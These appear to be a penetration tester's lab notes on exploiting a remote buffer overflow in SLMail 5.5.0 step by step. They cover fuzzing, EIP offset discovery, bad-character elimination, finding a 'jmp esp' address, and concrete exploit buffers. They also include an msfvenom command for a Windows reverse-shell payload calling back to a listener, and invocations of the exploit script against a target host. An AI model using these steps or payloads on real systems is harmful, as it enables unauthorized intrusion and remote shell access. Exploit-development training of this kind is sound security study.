Steps needed to trigger a remote buffer overflow (example used was SLMail_5.5.0 with immunity debugger)(See ~/KaliPentestCommands/BufferOverflow/immunityDbg.txt)

	Step 1 : Recreate the service on a virtual machine with the same OS version as the target's machine.
	Step 2 : Fuzz the service (~/KaliPentestCommands/BufferOverflow/Windows/pop3exploit.txt).
	Step 3 : Use pattern_create and pattern_offset to find the exact location of the crash (take the 'EIP' value after the crash and use it with 'pattern_offset.rb').
	Step 4 : Append characters after a string buffer of that offset size and check the EIP if those characters are correct, then append more to see if they allocate memory.
	Step 5 : Right click 'ESP' -> 'Follow in dump' to see memory.
	Step 5 : Find bad characters using my 'pop3exploit.py' script.
	Step 6 : Edit the badchars list in the 'pop3exploit.py' script and redo the script everytime (save the badchars and remove them from the list).
		 You can find bad chars by doing 'follow dump' on 'ESP' and checking the hex dumps '01 02 03 FE' or something similar means that '05' is a bad character.
		 Repeat this until the hex dump lists all the characters in the 'badchars' list.
	
	Step 7 : Use mona to find modules with ASLR and DEP disabled, the module's memory range shouldn't contain any bad characters. (addresses you use for this part should never contain bad characters)
		 (!p mona modules)
	Step 8 : Once you have found this module, go to the 'executable modules list' (e), then look for the module you found in step 7 and double-click on it
	Step 9 : Right click the assembly pane -> 'search for -> command -> "jmp esp"' (if not found, 'search for -> sequence of commands -> "push esp \n retn"')(the \n is an actual newline)
	Step 10: Go to 'modules list' (m) to check permissions
	Step 11: Find opcode equivalent to 'jmp esp' by using '/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb' with 'jmp esp'i -> result: FFE4
	Step 12: Search for the opcode with mona command: !mona find -s "<opcode>" -m <moduleName>	# example: !mona find -s "\xff\xe4" -m slmfc.dll
	Step 13: Look for an address with no bad characters and verify that it contains a 'jmp esp' instruction by clicking on the top bar '->:' button and enter the found address.
		 Check the instruction for 'jmp esp'

	Step 14: Add that address to your script's buffer where the address will overwrite EIP so that it will point to 'jmp esp'. This will eventually lead us to executing our shellcode.
		 You have to reverse the address (x86 little endian format) and convert it to shellcode (5F4A358F -> \x8f\x35\x4a\x5f), then after the address, add more buffer chars>
		 Python example: buffer = "A"*2606 + \x8f\x35\x4a\x5f + "C"*(3500-2610)

	Step 15: Restart immunity and slmail, place a breakpoint on that found address (->:) and run the exploit again
	Step 16: Generate shellcode, while avoiding bad characters 
		 # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.124 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread -f python -v shellcode
	
	Step 17: Use this payload after the 'jmp esp' payload (maybe add a few 'nopsled(\x90)' chars) and add padding at the end

	Examples of finished exploit script:

		python pop3exploit.py 192.168.0.117 110

		python pop3exploit.py 192.168.0.117 110 2700

		python pop3exploit.py pattern 192.168.0.117 110 `python -c 'print "A"*2606 + "\x8f\x35\x4a\x5f" + "C"*(3500-2610)'`

		python pop3exploit.py badchars 192.168.0.117 110 `python -c 'print "A"*2606 + "B"*4'`
			
		python pop3exploit.py shellcode 192.168.0.117 110 `python -c 'print "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*20'` `python -c 'print "C"*(3500-10-341)'` (unstaged payload)
